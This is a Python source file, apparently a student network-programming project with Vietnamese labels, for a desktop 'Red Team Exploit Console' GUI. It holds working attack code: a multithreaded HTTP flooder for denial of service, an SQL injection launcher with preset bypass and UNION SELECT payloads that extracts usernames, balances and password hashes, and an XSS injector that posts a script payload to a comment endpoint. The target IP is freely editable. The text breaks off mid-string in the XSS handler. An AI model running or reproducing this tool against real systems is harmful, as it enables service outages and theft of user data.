#!/usr/bin/env python3
"""
attacker_gui.py - Giao diện Desktop Đồ Họa Độc Lập Chuyên Nghiệp (Red Team Exploit Console)
Xây dựng trên nền tảng CustomTkinter / Tkinter Native Desktop (HOÀN TOÀN KHÔNG PHẢI WEB).
Phù hợp cho dự án Lập trình Mạng quy mô lớn:
- Đầy đủ thông số cấu hình mục tiêu, kiểm tra kết nối mạng (Ping / Latency).
- Trực quan hóa 3 đòn tấn công: DoS Flood (thanh trượt luồng/thời gian, tiến độ thời gian thực),
  SQL Injection (bảng trích xuất CSDL khách hàng bị đánh cắp), XSS Injection.
- Tự động nhận diện Phản đòn từ Tường lửa HIPS (Gói tin bị DROP 100%) và hiển thị cảnh báo đỏ rực.
"""
import sys
import time
import json
import threading
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path

# Kiểm tra thư viện CustomTkinter, nếu chưa có sẽ tự động import fallback Tkinter
try:
    import customtkinter as ctk
    USE_CUSTOMTKINTER = True
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
except ImportError:
    USE_CUSTOMTKINTER = False
    import tkinter as tk
    from tkinter import ttk, messagebox, scrolledtext


class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("🛡️ CÔNG CỤ TẤN CÔNG & KIỂM THỬ XÂM NHẬP (RED TEAM EXPLOIT CONSOLE)")
        self.geometry("1080x760")
        self.minsize(980, 680)

        # Trạng thái điều khiển
        self.is_attacking = False
        self.stop_event = threading.Event()
        self.target_ip = "192.168.144.1"
        self.target_port = 8080

        # Số liệu thống kê thời gian thực
        self.dos_stats = {"sent": 0, "crashed_503": 0, "dropped": 0}
        self.stats_lock = threading.Lock()

        # Dựng giao diện
        self._build_header()
        self._build_target_config()
        self._build_attack_workspace()
        self._build_console_log()

        self.log_event("[HỆ THỐNG] Khởi tạo thành công Red Team Exploit Console.", "info")
        self.log_event(f"[MỤC TIÊU] Mặc định trỏ tới Web Server tại http://{self.target_ip}:{self.target_port}/", "info")

    def _build_header(self):
        header_frame = ctk.CTkFrame(self, fg_color="#111827", corner_radius=8, height=65)
        header_frame.pack(fill="x", padx=14, pady=(12, 6))

        title_lbl = ctk.CTkLabel(
            header_frame,
            text="⚡ RED TEAM EXPLOIT CONSOLE - LẬP TRÌNH MẠNG",
            font=ctk.CTkFont(size=18, weight="bold"),
            text_color="#38bdf8"
        )
        title_lbl.pack(side="left", padx=18, pady=12)

        subtitle_lbl = ctk.CTkLabel(
            header_frame,
            text="Công cụ Kiểm thử Xâm nhập Đa Tầng (L4 DoS | L7 SQLi / XSS)",
            font=ctk.CTkFont(size=12),
            text_color="#94a3b8"
        )
        subtitle_lbl.pack(side="left", padx=5, pady=12)

        self.badge_status = ctk.CTkLabel(
            header_frame,
            text="● SẴN SÀNG",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="#10b981",
            fg_color="#064e3b",
            corner_radius=6,
            padx=12,
            pady=4
        )
        self.badge_status.pack(side="right", padx=16, pady=14)

    def _build_target_config(self):
        config_frame = ctk.CTkFrame(self, fg_color="#1e293b", corner_radius=8)
        config_frame.pack(fill="x", padx=14, pady=6)

        # Dòng 1: Cấu hình IP và Port
        top_row = ctk.CTkFrame(config_frame, fg_color="transparent")
        top_row.pack(fill="x", padx=14, pady=10)

        ip_lbl = ctk.CTkLabel(top_row, text="IP Máy Chủ Mục Tiêu:", font=ctk.CTkFont(weight="bold"))
        ip_lbl.pack(side="left", padx=(0, 8))

        self.ip_entry = ctk.CTkEntry(top_row, width=170, font=ctk.CTkFont(family="Consolas", size=13, weight="bold"))
        self.ip_entry.insert(0, self.target_ip)
        self.ip_entry.pack(side="left", padx=(0, 16))

        port_lbl = ctk.CTkLabel(top_row, text="Port:", font=ctk.CTkFont(weight="bold"))
        port_lbl.pack(side="left", padx=(0, 8))

        self.port_entry = ctk.CTkEntry(top_row, width=80, font=ctk.CTkFont(family="Consolas", size=13))
        self.port_entry.insert(0, str(self.target_port))
        self.port_entry.pack(side="left", padx=(0, 20))

        ping_btn = ctk.CTkButton(
            top_row,
            text="🔍 Kiểm Tra Kết Nối (Ping)",
            fg_color="#0284c7",
            hover_color="#0369a1",
            command=self.check_connection
        )
        ping_btn.pack(side="left", padx=5)

        # Các nút gán nhanh IP
        preset_lbl = ctk.CTkLabel(top_row, text="IP Nhanh:", text_color="#94a3b8")
        preset_lbl.pack(side="left", padx=(25, 8))

        btn_vm = ctk.CTkButton(
            top_row,
            text="VMnet8 (192.168.144.1)",
            width=150,
            fg_color="#334155",
            hover_color="#475569",
            command=lambda: self._set_ip("192.168.144.1")
        )
        btn_vm.pack(side="left", padx=4)

        btn_wifi = ctk.CTkButton(
            top_row,
            text="Wi-Fi (192.168.88.100)",
            width=140,
            fg_color="#334155",
            hover_color="#475569",
            command=lambda: self._set_ip("192.168.88.100")
        )
        btn_wifi.pack(side="left", padx=4)

        btn_local = ctk.CTkButton(
            top_row,
            text="Localhost (127.0.0.1)",
            width=130,
            fg_color="#334155",
            hover_color="#475569",
            command=lambda: self._set_ip("127.0.0.1")
        )
        btn_local.pack(side="left", padx=4)

    def _set_ip(self, ip_str):
        self.ip_entry.delete(0, "end")
        self.ip_entry.insert(0, ip_str)
        self.log_event(f"[*] Đã chọn IP mục tiêu: {ip_str}", "info")

    def _build_attack_workspace(self):
        # Tạo Tabview chứa các phân hệ tấn công
        self.tabview = ctk.CTkTabview(self, fg_color="#1e293b", segmented_button_selected_color="#0284c7")
        self.tabview.pack(fill="both", expand=True, padx=14, pady=6)

        self.tab_dos = self.tabview.add("⚡ Tấn Công DoS (Làm Sập Web)")
        self.tab_sqli = self.tabview.add("💉 SQL Injection (Rút Trích CSDL)")
        self.tab_xss = self.tabview.add("⚠️ Tấn Công XSS (Mã Độc Diễn Đàn)")
        self.tab_all = self.tabview.add("🔥 Chiến Dịch Toàn Diện (Cả 3 Đòn)")

        self._setup_dos_tab()
        self._setup_sqli_tab()
        self._setup_xss_tab()
        self._setup_all_tab()

    # ==========================================
    # PHÂN HỆ 1: TẤN CÔNG DoS
    # ==========================================
    def _setup_dos_tab(self):
        frame = self.tab_dos

        # Khung điều khiển tham số
        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        # Slider số luồng
        threads_box = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        threads_box.pack(fill="x", padx=15, pady=8)

        self.threads_lbl = ctk.CTkLabel(threads_box, text="Số luồng dội tải đồng thời (Threads): 15 luồng", font=ctk.CTkFont(weight="bold"))
        self.threads_lbl.pack(side="left")

        self.threads_slider = ctk.CTkSlider(
            threads_box,
            from_=5,
            to=40,
            number_of_steps=35,
            width=260,
            command=self._update_threads_label
        )
        self.threads_slider.set(15)
        self.threads_slider.pack(side="right")

        # Slider thời gian
        dur_box = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        dur_box.pack(fill="x", padx=15, pady=8)

        self.dur_lbl = ctk.CTkLabel(dur_box, text="Thời gian dội tải: 10 giây", font=ctk.CTkFont(weight="bold"))
        self.dur_lbl.pack(side="left")

        self.dur_slider = ctk.CTkSlider(
            dur_box,
            from_=5,
            to=30,
            number_of_steps=25,
            width=260,
            command=self._update_dur_label
        )
        self.dur_slider.set(10)
        self.dur_slider.pack(side="right")

        # Nút bấm phát động & Dừng
        btn_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        btn_row.pack(fill="x", padx=15, pady=(8, 12))

        self.btn_start_dos = ctk.CTkButton(
            btn_row,
            text="🚀 PHÁT ĐỘNG TẤN CÔNG DoS",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#dc2626",
            hover_color="#b91c1c",
            height=36,
            command=self.start_dos_attack
        )
        self.btn_start_dos.pack(side="left", expand=True, fill="x", padx=(0, 8))

        self.btn_stop_dos = ctk.CTkButton(
            btn_row,
            text="⏹ Dừng Dội Tải",
            font=ctk.CTkFont(weight="bold"),
            fg_color="#475569",
            hover_color="#334155",
            height=36,
            state="disabled",
            command=self.stop_attack
        )
        self.btn_stop_dos.pack(side="right", padx=(8, 0))

        # Thanh tiến độ và số liệu thống kê
        stats_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        stats_frame.pack(fill="both", expand=True, padx=12, pady=6)

        pb_row = ctk.CTkFrame(stats_frame, fg_color="transparent")
        pb_row.pack(fill="x", padx=15, pady=(12, 6))

        self.dos_pb = ctk.CTkProgressBar(pb_row, height=12)
        self.dos_pb.set(0)
        self.dos_pb.pack(fill="x")

        # 3 Thẻ số liệu KPI
        kpi_row = ctk.CTkFrame(stats_frame, fg_color="transparent")
        kpi_row.pack(fill="x", padx=15, pady=8)

        # Card 1: Tổng gửi
        c1 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c1.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c1, text="GÓI ĐÃ GỬI", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_sent = ctk.CTkLabel(c1, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#38bdf8")
        self.kpi_sent.pack(pady=(0, 6))

        # Card 2: Lỗi 503 (Thành công làm sập)
        c2 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c2.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c2, text="MÃ 503 (CẠN WORKER)", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_503 = ctk.CTkLabel(c2, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#fbbf24")
        self.kpi_503.pack(pady=(0, 6))

        # Card 3: Drop do Tường lửa (Phản đòn)
        c3 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c3.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c3, text="BỊ TƯỜNG LỬA DROP (PHẢN ĐÒN)", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_drop = ctk.CTkLabel(c3, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#f87171")
        self.kpi_drop.pack(pady=(0, 6))

        # Banner Kết Luận Phản Đòn
        self.dos_verdict_frame = ctk.CTkFrame(stats_frame, fg_color="#334155", corner_radius=6)
        self.dos_verdict_frame.pack(fill="x", padx=15, pady=(4, 12))

        self.dos_verdict_lbl = ctk.CTkLabel(
            self.dos_verdict_frame,
            text="Trạng thái: Chưa phát động tấn công. Nhấn nút bên trên để bắt đầu dội tải DoS.",
            font=ctk.CTkFont(size=12),
            text_color="#e2e8f0"
        )
        self.dos_verdict_lbl.pack(padx=12, pady=10)

    def _update_threads_label(self, val):
        self.threads_lbl.configure(text=f"Số luồng dội tải đồng thời (Threads): {int(val)} luồng")

    def _update_dur_label(self, val):
        self.dur_lbl.configure(text=f"Thời gian dội tải: {int(val)} giây")

    # ==========================================
    # PHÂN HỆ 2: SQL INJECTION
    # ==========================================
    def _setup_sqli_tab(self):
        frame = self.tab_sqli

        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        # Chọn Payload mẫu
        p_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        p_row.pack(fill="x", padx=15, pady=(10, 6))

        ctk.CTkLabel(p_row, text="Mẫu Payload SQLi:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))

        self.sqli_preset = ctk.CTkOptionMenu(
            p_row,
            values=[
                "admin' OR '1'='1",
                "' UNION SELECT id, username, full_name, role, balance, secret_hash FROM users --",
                "admin' --"
            ],
            width=360,
            command=self._apply_sqli_preset
        )
        self.sqli_preset.pack(side="left", padx=4)

        # Ô nhập Payload tùy biến
        custom_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        custom_row.pack(fill="x", padx=15, pady=6)

        ctk.CTkLabel(custom_row, text="Payload Thực Thi:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))

        self.sqli_entry = ctk.CTkEntry(custom_row, font=ctk.CTkFont(family="Consolas", size=13))
        self.sqli_entry.insert(0, "admin' OR '1'='1")
        self.sqli_entry.pack(side="left", fill="x", expand=True, padx=4)

        # Nút bấm khai thác
        self.btn_sqli = ctk.CTkButton(
            ctrl_frame,
            text="🚀 PHÁT ĐỘNG TẤN CÔNG SQL INJECTION & KHAI THÁC CSDL",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#d97706",
            hover_color="#b45309",
            height=36,
            command=self.start_sqli_attack
        )
        self.btn_sqli.pack(fill="x", padx=15, pady=(6, 12))

        # Bảng dữ liệu CSDL khách hàng bị rò rỉ (Exfiltrated DB Table)
        db_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        db_frame.pack(fill="both", expand=True, padx=12, pady=6)

        tbl_header = ctk.CTkFrame(db_frame, fg_color="#1e293b", height=32)
        tbl_header.pack(fill="x", padx=10, pady=(10, 4))

        ctk.CTkLabel(tbl_header, text="ID", width=40, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="HỌ VÀ TÊN KHÁCH HÀNG", width=220, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="TÀI KHOẢN", width=120, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="VAI TRÒ", width=100, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="SỐ DƯ TÀI KHOẢN", width=130, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="MÃ HASH MẬT KHẨU", font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", fill="x", expand=True, padx=4)

        self.sqli_scroll = ctk.CTkScrollableFrame(db_frame, fg_color="#090d16")
        self.sqli_scroll.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        # Dòng ban đầu
        init_lbl = ctk.CTkLabel(
            self.sqli_scroll,
            text="Chưa có dữ liệu trích xuất. Nhấn nút phát động tấn công SQLi bên trên để kiểm thử.",
            text_color="#64748b",
            font=ctk.CTkFont(size=12)
        )
        init_lbl.pack(pady=25)

    def _apply_sqli_preset(self, val):
        self.sqli_entry.delete(0, "end")
        self.sqli_entry.insert(0, val)

    # ==========================================
    # PHÂN HỆ 3: XSS INJECTION
    # ==========================================
    def _setup_xss_tab(self):
        frame = self.tab_xss

        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        row1 = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        row1.pack(fill="x", padx=15, pady=(10, 6))

        ctk.CTkLabel(row1, text="Tác giả (Author):", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.xss_author = ctk.CTkEntry(row1, width=200)
        self.xss_author.insert(0, "RedTeam_Attacker")
        self.xss_author.pack(side="left", padx=4)

        row2 = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        row2.pack(fill="x", padx=15, pady=6)

        ctk.CTkLabel(row2, text="Mã độc Script XSS:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.xss_entry = ctk.CTkEntry(row2, font=ctk.CTkFont(family="Consolas", size=13))
        self.xss_entry.insert(0, "<script>alert('He thong bi hack boi Red Team!')</script>")
        self.xss_entry.pack(side="left", fill="x", expand=True, padx=4)

        self.btn_xss = ctk.CTkButton(
            ctrl_frame,
            text="🚀 PHÁT ĐỘNG TIÊM MÃ ĐỘC XSS VÀO HỆ THỐNG",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#8b5cf6",
            hover_color="#7c3aed",
            height=36,
            command=self.start_xss_attack
        )
        self.btn_xss.pack(fill="x", padx=15, pady=(6, 12))

        # Khung hiển thị bằng chứng XSS
        res_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        res_frame.pack(fill="both", expand=True, padx=12, pady=6)

        ctk.CTkLabel(res_frame, text="BẰNG CHỨNG XÁC THỰC LỖ HỔNG XSS:", font=ctk.CTkFont(weight="bold", size=12)).pack(anchor="w", padx=15, pady=(12, 4))

        self.xss_result_text = ctk.CTkTextbox(res_frame, font=ctk.CTkFont(family="Consolas", size=12), fg_color="#090d16")
        self.xss_result_text.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        self.xss_result_text.insert("1.0", "[Chưa có dữ liệu phản hồi từ máy chủ]")

    # ==========================================
    # PHÂN HỆ 4: CHIẾN DỊCH TOÀN DIỆN (3 TRONG 1)
    # ==========================================
    def _setup_all_tab(self):
        frame = self.tab_all

        intro_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        intro_frame.pack(fill="x", padx=12, pady=(10, 8))

        ctk.CTkLabel(
            intro_frame,
            text="KỊCH BẢN TẤN CÔNG LIÊN TỤC 3 ĐÒN:",
            font=ctk.CTkFont(weight="bold", size=13),
            text_color="#38bdf8"
        ).pack(anchor="w", padx=15, pady=(10, 4))

        steps_text = (
            "  1. Giai đoạn 1: Dội tải DoS trong 8 giây (Làm suy kiệt hàng đợi và Worker Pool).\n"
            "  2. Giai đoạn 2: Phát động SQL Injection qua lỗ hổng bypass để trích xuất CSDL khách hàng.\n"
            "  3. Giai đoạn 3: Phát động tiêm mã độc XSS vào hệ thống bình luận.\n"
            "  👉 Tự động kiểm tra và ghi nhận phản đòn nếu HIPS máy chủ đang hoạt động!"
        )
        ctk.CTkLabel(intro_frame, text=steps_text, justify="left", font=ctk.CTkFont(size=12), text_color="#cbd5e1").pack(anchor="w", padx=15, pady=(0, 10))

        self.btn_campaign = ctk.CTkButton(
            intro_frame,
            text="⚡ BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG TOÀN DIỆN (3 ĐÒN LIÊN HOÀN)",
            font=ctk.CTkFont(weight="bold", size=14),
            fg_color="#e11d48",
            hover_color="#be123c",
            height=42,
            command=self.start_campaign_attack
        )
        self.btn_campaign.pack(fill="x", padx=15, pady=(4, 15))

    # ==========================================
    # KHUNG NHẬT KÝ CONSOLE PHÍA DƯỚI
    # ==========================================
    def _build_console_log(self):
        console_frame = ctk.CTkFrame(self, fg_color="#0f172a", corner_radius=8, height=180)
        console_frame.pack(fill="x", padx=14, pady=(6, 12))

        # Tiêu đề + nút bấm điều khiển
        top_bar = ctk.CTkFrame(console_frame, fg_color="transparent")
        top_bar.pack(fill="x", padx=12, pady=(8, 4))

        lbl = ctk.CTkLabel(top_bar, text="📋 NHẬT KÝ HOẠT ĐỘNG THỜI GIAN THỰC (REAL-TIME CONSOLE):", font=ctk.CTkFont(weight="bold", size=12))
        lbl.pack(side="left")

        btn_save = ctk.CTkButton(top_bar, text="Lưu Báo Cáo (.txt)", width=120, height=26, fg_color="#334155", hover_color="#475569", command=self.save_log_file)
        btn_save.pack(side="right", padx=4)

        btn_clear = ctk.CTkButton(top_bar, text="Xóa Màn Hình", width=100, height=26, fg_color="#334155", hover_color="#475569", command=self.clear_console)
        btn_clear.pack(side="right", padx=4)

        self.console_text = ctk.CTkTextbox(
            console_frame,
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color="#020617",
            text_color="#f8fafc",
            height=130
        )
        self.console_text.pack(fill="both", expand=True, padx=12, pady=(0, 10))

    def log_event(self, msg, level="info"):
        t_str = time.strftime("[%H:%M:%S]")
        formatted = f"{t_str} {msg}\n"
        self.console_text.insert("end", formatted)
        self.console_text.see("end")

    def clear_console(self):
        self.console_text.delete("1.0", "end")
        self.log_event("[HỆ THỐNG] Đã làm sạch toàn bộ nhật ký console.", "info")

    def save_log_file(self):
        content = self.console_text.get("1.0", "end")
        out_file = Path(__file__).resolve().parent / f"attack_report_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(content)
        self.log_event(f"[LƯU TRỮ] Đã xuất báo cáo tấn công ra file: {out_file.name}", "info")

    def get_target(self):
        ip = self.ip_entry.get().strip() or "192.168.144.1"
        try:
            port = int(self.port_entry.get().strip() or "8080")
        except ValueError:
            port = 8080
        return ip, port

    # ==========================================
    # LOGIC KIỂM TRA KẾT NỐI
    # ==========================================
    def check_connection(self):
        ip, port = self.get_target()
        self.log_event(f"[*] Đang ping kiểm tra kết nối tới http://{ip}:{port}/api/health...", "info")

        def _worker():
            try:
                url = f"http://{ip}:{port}/api/health"
                req = urllib.request.Request(url, headers={"User-Agent": "HealthMonitor/2.0"})
                t0 = time.time()
                with urllib.request.urlopen(req, timeout=2.5) as resp:
                    lat = round((time.time() - t0) * 1000, 1)
                    data = json.loads(resp.read().decode())
                    status = data.get("status")
                    self.log_event(f"[✓] Kết nối THÀNH CÔNG! Độ trễ: {lat}ms | Trạng thái máy chủ: {status}", "info")
                    self.badge_status.configure(text=f"● ONLINE ({lat}ms)", text_color="#10b981", fg_color="#064e3b")
            except urllib.error.HTTPError as e:
                if e.code == 503:
                    self.log_event("[!] Máy chủ ĐANG BỊ SẬP (HTTP 503 Service Unavailable)! Không còn worker slot!", "warning")
                    self.badge_status.configure(text="● 503 CRASHED", text_color="#fbbf24", fg_color="#78350f")
                else:
                    self.log_event(f"[-] HTTP Error: {e.code}", "danger")
            except Exception as e:
                self.log_event(f"[!] PHẢN ĐÒN TỪ MÁY CHỦ: Không thể kết nối (Socket Dropped / Refused: {e})", "danger")
                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d")

        threading.Thread(target=_worker, daemon=True).start()

    # ==========================================
    # THỰC THI TẤN CÔNG DoS
    # ==========================================
    def start_dos_attack(self):
        if self.is_attacking:
            return
        ip, port = self.get_target()
        threads_count = int(self.threads_slider.get())
        duration_sec = int(self.dur_slider.get())

        self.is_attacking = True
        self.stop_event.clear()
        self.btn_start_dos.configure(state="disabled")
        self.btn_stop_dos.configure(state="normal")
        self.badge_status.configure(text="● ĐANG DỘI TẢI DoS", text_color="#fbbf24", fg_color="#78350f")

        self.dos_stats = {"sent": 0, "crashed_503": 0, "dropped": 0}
        self.kpi_sent.configure(text="0")
        self.kpi_503.configure(text="0")
        self.kpi_drop.configure(text="0")
        self.dos_pb.set(0)
        self.dos_verdict_lbl.configure(text="Đang dội tải DoS...")
        self.dos_verdict_frame.configure(fg_color="#334155")

        self.log_event(f"[+] Bắt đầu phát động DoS ({threads_count} luồng, thời lượng {duration_sec}s) vào http://{ip}:{port}/api/search", "warning")

        def _flood_worker(url):
            while not self.stop_event.is_set():
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "DoS-Attacker/3.0"})
                    with urllib.request.urlopen(req, timeout=1.5) as r:
                        with self.stats_lock:
                            self.dos_stats["sent"] += 1
                except urllib.error.HTTPError as e:
                    with self.stats_lock:
                        self.dos_stats["sent"] += 1
                        if e.code == 503:
                            self.dos_stats["crashed_503"] += 1
                except Exception:
                    with self.stats_lock:
                        self.dos_stats["sent"] += 1
                        self.dos_stats["dropped"] += 1
                time.sleep(0.05)

        def _manager():
            target_url = f"http://{ip}:{port}/api/search?q=dos_flood_attack"
            threads = [threading.Thread(target=_flood_worker, args=(target_url,), daemon=True) for _ in range(threads_count)]
            for t in threads:
                t.start()

            start_t = time.time()
            for step in range(duration_sec):
                if self.stop_event.is_set():
                    break
                time.sleep(1.0)
                elapsed = time.time() - start_t
                progress = min(elapsed / duration_sec, 1.0)
                self.dos_pb.set(progress)

                with self.stats_lock:
                    s = self.dos_stats["sent"]
                    c = self.dos_stats["crashed_503"]
                    d = self.dos_stats["dropped"]

                self.kpi_sent.configure(text=str(s))
                self.kpi_503.configure(text=str(c))
                self.kpi_drop.configure(text=str(d))

                # Tự ngắt sớm nếu phát hiện bị Tường lửa máy chủ khóa (Phản đòn)
                if d > 15 and c < 5:
                    self.log_event("[!] Phát hiện Tường lửa máy chủ đã ngắt kết nối! Dừng dội tải sớm.", "danger")
                    break

            self.stop_event.set()
            for t in threads:
                t.join(timeout=0.5)

            self.is_attacking = False
            self.btn_start_dos.configure(state="normal")
            self.btn_stop_dos.configure(state="disabled")

            with self.stats_lock:
                final_s = self.dos_stats["sent"]
                final_c = self.dos_stats["crashed_503"]
                final_d = self.dos_stats["dropped"]

            # Phân tích kết luận
            if final_c >= 10:
                msg = f"✓ BẰNG CHỨNG TẤN CÔNG THÀNH CÔNG: Máy chủ bị quá tải và trả về {final_c} mã lỗi 503 Service Unavailable!"
                self.dos_verdict_lbl.configure(text=msg, text_color="#fef08a")
                self.dos_verdict_frame.configure(fg_color="#854d0e")
                self.badge_status.configure(text="● SẬP MÁY CHỦ (503)", text_color="#fef08a", fg_color="#854d0e")
                self.log_event(f"[✓] {msg}", "info")
            elif final_d > 10:
                msg = f"✗ PHẢN ĐÒN TỪ MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC! Tường lửa HIPS đã phát hiện và khóa IP của bạn ({final_d} gói bị DROP 100%)!"
                self.dos_verdict_lbl.configure(text=msg, text_color="#fca5a5")
                self.dos_verdict_frame.configure(fg_color="#991b1b")
                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
                self.log_event(f"[-] {msg}", "danger")
            else:
                msg = f"[*] Đã hoàn tất đợt DoS: Đã gửi {final_s} gói tin."
                self.dos_verdict_lbl.configure(text=msg, text_color="#e2e8f0")
                self.dos_verdict_frame.configure(fg_color="#334155")
                self.badge_status.configure(text="● SẴN SÀNG", text_color="#10b981", fg_color="#064e3b")
                self.log_event(msg, "info")

        threading.Thread(target=_manager, daemon=True).start()

    def stop_attack(self):
        self.stop_event.set()
        self.log_event("[*] Đã yêu cầu dừng toàn bộ các luồng dội tải DoS.", "info")

    # ==========================================
    # THỰC THI SQL INJECTION
    # ==========================================
    def start_sqli_attack(self):
        ip, port = self.get_target()
        raw_payload = self.sqli_entry.get().strip()
        encoded = urllib.parse.quote(raw_payload)
        url = f"http://{ip}:{port}/api/login?user={encoded}&pass=any"

        self.log_event(f"[+] Đang phát động tấn công SQL Injection vào: {url}", "warning")

        def _worker():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-SQLi/3.0"})
                with urllib.request.urlopen(req, timeout=3.0) as resp:
                    data = json.loads(resp.read().decode())
                    records = data.get("leaked_database", [])

                    # Xóa bảng cũ và hiển thị bản ghi rò rỉ mới
                    for widget in self.sqli_scroll.winfo_children():
                        widget.destroy()

                    if records:
                        self.log_event(f"[✓] BẰNG CHỨNG SQLi THÀNH CÔNG: Trích xuất được {len(records)} hồ sơ nhạy cảm từ CSDL máy chủ!", "info")
                        for u in records:
                            row = ctk.CTkFrame(self.sqli_scroll, fg_color="#111827", height=28)
                            row.pack(fill="x", pady=2)

                            ctk.CTkLabel(row, text=str(u.get("id")), width=40, text_color="#38bdf8").pack(side="left", padx=4)
                            ctk.CTkLabel(row, text=u.get("full_name", ""), width=220, text_color="#f8fafc").pack(side="left", padx=4)
                            ctk.CTkLabel(row, text=u.get("username", ""), width=120, text_color="#fbbf24").pack(side="left", padx=4)
                            ctk.CTkLabel(row, text=u.get("role", ""), width=100, text_color="#a855f7").pack(side="left", padx=4)
                            ctk.CTkLabel(row, text=u.get("balance", ""), width=130, text_color="#4ade80", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
                            ctk.CTkLabel(row, text=u.get("secret_hash", ""), text_color="#94a3b8", font=ctk.CTkFont(family="Consolas", size=11)).pack(side="left", fill="x", expand=True, padx=4)

                            self.log_event(f"    ├─ [{u.get('id')}] {u.get('full_name')} | User: {u.get('username')} | Số dư: {u.get('balance')}", "info")
                    else:
                        lbl = ctk.CTkLabel(self.sqli_scroll, text="Không có dữ liệu rò rỉ nào được trả về.", text_color="#94a3b8")
                        lbl.pack(pady=20)
            except Exception as e:
                for widget in self.sqli_scroll.winfo_children():
                    widget.destroy()

                err_frame = ctk.CTkFrame(self.sqli_scroll, fg_color="#7f1d1d", corner_radius=6)
                err_frame.pack(fill="x", padx=10, pady=15)
                ctk.CTkLabel(
                    err_frame,
                    text="❌ PHẢN ĐÒN TỪ MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC!\nTường lửa máy chủ (HIPS) đã chặn đứng kết nối của bạn. Gói tin bị DROP 100%!",
                    font=ctk.CTkFont(weight="bold", size=13),
                    text_color="#fecaca"
                ).pack(padx=15, pady=12)

                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
                self.log_event("[-] PHẢN ĐÒN TỪ MÁY CHỦ: Bạn đã bị tấn công ngược! Tường lửa HIPS đã khóa IP.", "danger")

        threading.Thread(target=_worker, daemon=True).start()

    # ==========================================
    # THỰC THI XSS INJECTION
    # ==========================================
    def start_xss_attack(self):
        ip, port = self.get_target()
        author = self.xss_author.get().strip() or "RedTeam"
        raw_script = self.xss_entry.get().strip()
        encoded = urllib.parse.quote(raw_script)
        url = f"http://{ip}:{port}/api/comment?author={urllib.parse.quote(author)}&content={encoded}"

        self.log_event(f"[+] Đang phát động tấn công XSS vào: {url}", "warning")

        def _worker():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-XSS/3.0"})
                with urllib.request.urlopen(req, timeout=3.0) as resp:
                    data = json.loads(resp.read().decode())
                    self.xss_result_text.delete("1.0", "end")
                    msg = (
                        f"✓ BẰNG CHỨNG XSS THÀNH CÔNG:\n"
                        f"--------------------------------------------------\n"
